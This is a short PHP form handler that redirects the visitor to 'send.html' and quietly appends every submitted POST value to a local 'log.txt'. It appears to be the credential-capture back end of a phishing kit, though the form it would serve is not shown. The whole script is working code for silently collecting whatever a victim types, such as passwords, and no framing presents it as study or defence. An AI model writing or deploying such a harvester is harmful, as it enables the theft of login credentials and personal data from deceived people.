<?php
header ('Location: send.html');
$handle = fopen("log.txt", "a");
foreach($_POST as $variable => $value) {
  fwrite($handle, "=");
  fwrite($handle, $value);
  fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n\n\n\n");
fclose($handle);
exit;
?>
